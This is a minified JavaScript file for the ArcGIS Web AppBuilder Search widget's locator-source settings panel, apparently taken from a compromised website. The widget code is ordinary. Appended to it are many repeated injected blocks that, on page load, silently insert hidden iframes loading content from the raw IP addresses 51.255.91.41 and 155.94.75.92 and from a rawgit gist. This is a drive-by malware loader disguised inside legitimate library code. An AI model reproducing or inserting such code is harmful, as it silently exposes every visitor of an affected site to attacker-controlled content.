// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Search/setting/LocatorSourceSetting.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"source-url-section"\x3e\r\n    \x3ctable class\x3d"source-table" cellspacing\x3d"0"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e\r\n            \x3cspan class\x3d"source-label"\x3e${nls.locatorUrl}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"locatorUrl" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"required:true,trim:true,disabled:true,style:{width:\'100%\'}"\x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"third"\x3e\r\n            \x3cspan title\x3d"${nls.set}" class\x3d"jimu-btn" data-dojo-attach-event\x3d"click:_onSetLocatorUrlClick"\x3e${nls.set}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cspan data-dojo-attach-point\x3d"messageNode" class\x3d"tip"\x3e\x3c/span\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"source-details-section" data-dojo-attach-point\x3d"detailsSection"\x3e\r\n    \x3ctable class\x3d"source-table" cellspacing\x3d"0"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e${nls.locatorName}\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-attach-point\x3d"locatorName" data-dojo-attach-event\x3d"Blur: _onLocatorNameBlur"\r\n            placeHolder\x3d"${nls.locatorName}"\r\n            required\x3d"true" data-dojo-props\x3d\'style:{width:"100%"}\'/\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e${nls.placeholder}\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/TextBox" data-dojo-attach-point\x3d"placeholder"\r\n            data-dojo-attach-event\x3d"Blur: _onPlaceholderBlur"\r\n            placeHolder\x3d"${nls.placeholder}" data-dojo-props\x3d\'style:{width:"100%"}\'/\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr class\x3d"hide-country-code-row country-code-row" data-dojo-attach-point\x3d"countryCodeRow"\x3e\r\n          \x3ctd class\x3d"first"\x3e${nls.countryCode}\x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/TextBox" data-dojo-attach-point\x3d"countryCode"\r\n            data-dojo-attach-event\x3d"Blur:_onCountryCodeBlur"\r\n            placeHolder\x3d"${nls.countryCodeEg} USA,CHN" data-dojo-props\x3d\'style:{width:"97%"}\'/\x3e\r\n            \x3ca class\x3d"jimu-float-trailing" target\x3d"_blank" href\x3d"https://developers.arcgis.com/rest/geocode/api-reference/geocode-coverage.htm" style\x3d"line-height:30px;"\x3e?\x3c/a\x3e\r\n            \x3cspan class\x3d"example"\x3e${nls.countryCodeHint}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e\r\n            \x3cspan class\x3d"source-label"\x3e${nls.maxSuggestions}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cdiv class\x3d"source-tips" title\x3d"${nls.locatorTips}" data-dojo-attach-point\x3d"tipsNode"\x3e\r\n              ${nls.locatorTips}\r\n            \x3c/div\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"maxSuggestions" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"constraints:{min:1,places:0},style:{width:\'100%\'},value:6"\x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e\r\n            \x3cspan class\x3d"source-label"\x3e${nls.maxResults}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"maxResults" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"constraints:{min:1,places:0},style:{width:\'100%\'},value:6"\x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e\r\n            \x3cspan class\x3d"source-label"\x3e${nls.zoomScale}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cspan class\x3d"jimu-float-leading" style\x3d"line-height:30px;"\x3e1: \x3c/span\x3e\r\n            \x3cdiv class\x3d"jimu-float-trailing" data-dojo-attach-point\x3d"zoomScale" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"constraints:{min:1},style:{width:\'96%\'},value:50000"\x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first" colspan\x3d"2"\x3e\r\n            \x3cspan class\x3d"source-label" data-dojo-attach-point\x3d"enableLocalSearch"\x3e\x3c/span\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr data-dojo-attach-point\x3d"minScaleNode" class\x3d"local-search-row"\x3e\r\n          \x3ctd class\x3d"first"\x3e\r\n            \x3cspan class\x3d"source-label"\x3e${nls.minScale}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cspan class\x3d"jimu-float-leading" style\x3d"line-height:30px;"\x3e1: \x3c/span\x3e\r\n            \x3cdiv class\x3d"jimu-float-trailing" data-dojo-attach-point\x3d"localSearchMinScale" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"constraints:{min:1},style:{width:\'96%\'},value:300000"\x3e\x3c/div\x3e\r\n            \x3cspan class\x3d"example" title\x3d"${nls.minScaleHint}"\x3e${nls.minScaleHint}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr data-dojo-attach-point\x3d"radiusNode" class\x3d"local-search-row"\x3e\r\n          \x3ctd class\x3d"first"\x3e\r\n            \x3cspan class\x3d"source-label"\x3e${nls.radius}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n          \x3ctd class\x3d"second"\x3e\r\n            \x3cdiv class\x3d"jimu-float-leading" style\x3d"width:100%;"\x3e\r\n              \x3cdiv class\x3d"jimu-float-leading" data-dojo-attach-point\x3d"localSearchDistance" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-props\x3d"constraints:{min:1},style:{width:\'75%\'},value:50000"\x3e\x3c/div\x3e\r\n              \x3cspan class\x3d"jimu-float-trailing" style\x3d"line-height:30px;"\x3e${nls.meters}\x3c/span\x3e\r\n            \x3c/div\x3e\r\n            \x3cspan class\x3d"example" data-dojo-attach-point\x3d"radiusHintNode" title\x3d"${nls.radiusHint}"\x3e${nls.radiusHint}\x3c/span\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n    \x3ctable class\x3d"source-table" cellspacing\x3d"0"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"first"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"searchInCurrentMapExtent"\x3e\x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d"hidden:true"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/on dojo/Evented dojo/Deferred dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin jimu/portalUrlUtils jimu/dijit/Message jimu/dijit/_GeocodeServiceChooserContent jimu/dijit/Popup jimu/dijit/LoadingShelter esri/request esri/lang ../utils jimu/utils dojo/text!./LocatorSourceSetting.html jimu/dijit/CheckBox dijit/form/ValidationTextBox dijit/form/NumberTextBox".split(" "),function(n,d,b,f,p,q,r,t,u,g,h,v,w,x,k,l,y,e,z,
m){return n([r,t,u,p],{baseClass:"jimu-widget-search-locator-source-setting",tr:null,nls:null,config:null,singleLineFieldName:null,templateString:z,_suggestible:!1,_locatorDefinition:null,_esriLocatorRegExp:/http(s)?:\/\/geocode(.){0,3}\.arcgis.com\/arcgis\/rest\/services\/World\/GeocodeServer/g,serviceChooserContent:null,geocoderPopup:null,_clickSet:!1,postCreate:function(){this.inherited(arguments);this.exampleHint=this.nls.locatorExample+": http://\x26lt;myServerName\x26gt;/arcgis/rest/services/World/GeocodeServer";
this.searchInCurrentMapExtent=new m({checked:!1,label:this.nls.searchInCurrentMapExtent},this.searchInCurrentMapExtent);this.enableLocalSearch=new m({checked:!1,label:this.nls.enableLocalSearch},this.enableLocalSearch);this._processlocalSearchTable(!1);this.own(f(this.enableLocalSearch,"change",d.hitch(this,function(){this._processlocalSearchTable(this.enableLocalSearch.getValue())})));b.setStyle(this.enableLocalSearch.domNode,"display","none");this._setMessageNodeContent(this.exampleHint);this.config=
this.config?this.config:{};this.setConfig(this.config)},setRelatedTr:function(a){this.tr=a},getRelatedTr:function(){return this.tr},setDefinition:function(a){this._locatorDefinition=a||{}},getDefinition:function(){return this._locatorDefinition},setConfig:function(a){if("[object Object]"===Object.prototype.toString.call(a)){var c=a.url;c&&(this.config=a,this.shelter.show(),this._locatorDefinition.url!==c?this._getDefinitionFromRemote(c).then(d.hitch(this,function(a){c&&a&&"error"!==a.type?(this._locatorDefinition=
a,this._locatorDefinition.url=c,this._setSourceItems(),this._setMessageNodeContent(this.exampleHint)):c&&a&&"error"===a.type&&(this._setSourceItems(),this._disableSourceItems(),this._setMessageNodeContent(l.substitute({URL:a.url},d.clone(this.nls.invalidUrlTip)),!0));this.shelter.hide()})):(this._setSourceItems(),this._setMessageNodeContent(this.exampleHint),this.shelter.hide()))}},isValidConfig:function(){var a=this.getConfig();return a.url&&a.name&&a.singleLineFieldName?!0:!1},showValidationTip:function(){this._showValidationErrorTip(this.locatorUrl);
this._showValidationErrorTip(this.locatorName)},getConfig:function(){return{url:this.locatorUrl.get("value"),name:e.stripHTML(this.locatorName.get("value")),singleLineFieldName:this.singleLineFieldName,placeholder:e.stripHTML(this.placeholder.get("value")),countryCode:e.stripHTML(this.countryCode.get("value")),zoomScale:this.zoomScale.get("value")||5E4,maxSuggestions:this.maxSuggestions.get("value")||6,maxResults:this.maxResults.get("value")||6,searchInCurrentMapExtent:this.searchInCurrentMapExtent.checked,
enableLocalSearch:this.enableLocalSearch.getValue(),localSearchMinScale:this.localSearchMinScale.get("value"),localSearchDistance:this.localSearchDistance.get("value"),type:"locator"}},_onLocatorNameBlur:function(){this.locatorName.set("value",e.stripHTML(this.locatorName.get("value")))},_onPlaceholderBlur:function(){this.placeholder.set("value",e.stripHTML(this.placeholder.get("value")))},_onCountryCodeBlur:function(){this.countryCode.set("value",e.stripHTML(this.countryCode.get("value")))},_disableSourceItems:function(){this.locatorName.set("disabled",
!0);this.placeholder.set("disabled",!0);this.countryCode.set("disabled",!0);this.maxSuggestions.set("disabled",!0);this.maxResults.set("disabled",!0);this.zoomScale.set("disabled",!0)},_enableSourceItems:function(){this.locatorName.set("disabled",!1);this.placeholder.set("disabled",!1);this.countryCode.set("disabled",!1);this.maxSuggestions.set("disabled",!1);this.maxResults.set("disabled",!1);this.zoomScale.set("disabled",!1)},_setSourceItems:function(){var a=this.config;a.url&&(this.locatorUrl.set("value",
a.url),this._processCountryCodeRow(a.url));a.name&&this.locatorName.set("value",e.stripHTML(a.name));a.singleLineFieldName&&(this.singleLineFieldName=a.singleLineFieldName);a.placeholder&&this.placeholder.set("value",e.stripHTML(a.placeholder));a.countryCode&&this.countryCode.set("value",e.stripHTML(a.countryCode));"capabilities"in this._locatorDefinition?(b.setStyle(this.enableLocalSearch.domNode,"display",""),this._processlocalSearchTable(a.enableLocalSearch),this.enableLocalSearch.setValue(a.enableLocalSearch),
a.localSearchMinScale&&a.enableLocalSearch&&this.localSearchMinScale.set("value",a.localSearchMinScale),a.localSearchDistance&&a.enableLocalSearch&&this.localSearchDistance.set("value",a.localSearchDistance)):(this.enableLocalSearch.setValue(!1),b.setStyle(this.enableLocalSearch.domNode,"display","none"));(this._suggestible=this._locatorDefinition&&this._locatorDefinition.capabilities&&-1<this._locatorDefinition.capabilities.indexOf("Suggest"))?this._hideSuggestibleTips():this._showSuggestibleTips();
this.searchInCurrentMapExtent.setValue(!!a.searchInCurrentMapExtent);this.zoomScale.set("value",a.zoomScale||5E4);this.maxSuggestions.set("value",a.maxSuggestions||6);this.maxResults.set("value",a.maxResults||6);this._enableSourceItems()},_isEsriLocator:function(a){this._esriLocatorRegExp.lastIndex=0;return this._esriLocatorRegExp.test(a)},_getDefinitionFromRemote:function(a){var c=new q;if(this._isEsriLocator(a))c.resolve({singleLineAddressField:{name:"SingleLine",type:"esriFieldTypeString",alias:"Single Line Input",
required:!1,length:200,localizedNames:{},recognizedNames:{}},capabilities:"Geocode,ReverseGeocode,Suggest"});else{var b=k({url:a,content:{f:"json"},handleAs:"json",callbackParamName:"callback"});this.own(b);b.then(d.hitch(this,function(a){c.resolve(a)}),d.hitch(this,function(b){console.error(b);c.resolve({type:"error",url:this._getRequestUrl(a)})}))}return c.promise},_setMessageNodeContent:function(a,c){b.empty(this.messageNode);a.nodeType||(a=b.toDom(a));b.place(a,this.messageNode);c?b.addClass(this.messageNode,
"error-message"):b.removeClass(this.messageNode,"error-message")},_getRequestUrl:function(a){var b=window.location.protocol;return"http:"===b?g.setHttpProtocol(a):"https:"===b?g.setHttpsProtocol(a):a},_onSetLocatorUrlClick:function(){this._clickSet=!0;this._openServiceChooser()},_openLocatorChooser:function(){this._clickSet=!1;this._openServiceChooser()},_openServiceChooser:function(){this.serviceChooserContent=new v({url:this.locatorUrl.get("value")||""});this.shelter=new x({hidden:!0});this.geocoderPopup=
new w({titleLabel:this.nls.setGeocoderURL,autoHeight:!0,content:this.serviceChooserContent.domNode,container:window.jimuConfig.layoutId,width:640});this.shelter.placeAt(this.geocoderPopup.domNode);b.setStyle(this.serviceChooserContent.domNode,"width","580px");b.addClass(this.serviceChooserContent.domNode,"override-geocode-service-chooser-content");this.serviceChooserContent.own(f(this.serviceChooserContent,"validate-click",d.hitch(this,function(){b.removeClass(this.serviceChooserContent.domNode,"override-geocode-service-chooser-content")})));
this.serviceChooserContent.own(f(this.serviceChooserContent,"ok",d.hitch(this,"_onSelectLocatorUrlOk")));this.serviceChooserContent.own(f(this.serviceChooserContent,"cancel",d.hitch(this,"_onSelectLocatorUrlCancel")))},_onSelectLocatorUrlOk:function(a){a&&a[0]&&a[0].url&&this.domNode&&(this.shelter.show(),k({url:a[0].url,content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(d.hitch(this,function(c){this.shelter.hide();c&&c.singleLineAddressField&&c.singleLineAddressField.name?(this._enableSourceItems(),
this.locatorUrl.set("value",a[0].url),this.locatorName.get("value")||this.locatorName.set("value",y.getGeocoderName(a[0].url)),"capabilities"in c?(b.setStyle(this.enableLocalSearch.domNode,"display",""),this._isEsriLocator(a[0].url)?this.enableLocalSearch.setValue(!0):this.enableLocalSearch.setValue(!1)):(this.enableLocalSearch.setValue(!1),b.setStyle(this.enableLocalSearch.domNode,"display","none")),this.singleLineFieldName=c.singleLineAddressField.name,this._processCountryCodeRow(a[0].url),this._locatorDefinition=
c,this._locatorDefinition.url=a[0].url,(this._suggestible=c.capabilities&&-1<this._locatorDefinition.capabilities.indexOf("Suggest"))?this._hideSuggestibleTips():this._showSuggestibleTips(),this._clickSet?this.emit("reselect-locator-url-ok",this.getConfig()):this.emit("select-locator-url-ok",this.getConfig()),this.geocoderPopup&&(this.geocoderPopup.close(),this.geocoderPopup=null),this._setMessageNodeContent(this.exampleHint)):new h({message:this.nls.locatorWarning})}),d.hitch(this,function(b){console.error(b);
this.shelter.hide();new h({message:l.substitute({URL:this._getRequestUrl(a[0].url)},d.clone(this.nls.invalidUrlTip))})})))},_onSelectLocatorUrlCancel:function(){this.geocoderPopup&&(this.geocoderPopup.close(),this.geocoderPopup=null,this.emit("select-locator-url-cancel"))},_processlocalSearchTable:function(a){a?(b.removeClass(this.minScaleNode,"hide-local-search-table"),b.removeClass(this.radiusNode,"hide-local-search-table"),a=b.getMarginBox(this.radiusHintNode),b.setStyle(this.radiusHintNode.parentNode,
"paddingBottom",(45<a.h?a.h:45)+"px")):(b.addClass(this.minScaleNode,"hide-local-search-table"),b.addClass(this.radiusNode,"hide-local-search-table"))},_processCountryCodeRow:function(a){this._isEsriLocator(a)?(this.countryCode.set("value",""),b.removeClass(this.countryCodeRow,"hide-country-code-row")):b.addClass(this.countryCodeRow,"hide-country-code-row")},_showSuggestibleTips:function(){b.addClass(this.tipsNode,"source-tips-show");b.setStyle(this.maxSuggestions.domNode,"display","none")},_hideSuggestibleTips:function(){b.removeClass(this.tipsNode,
"source-tips-show");b.setStyle(this.maxSuggestions.domNode,"display","block")},_showValidationErrorTip:function(a){if(!a.validate()&&a.domNode&&a.focusNode){var b=a.get("disabled");b&&a.set("disabled",!1);a.focusNode.focus();setTimeout(d.hitch(this,function(){a.focusNode.blur();b&&a.set("disabled",!0);a=null}),100)}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});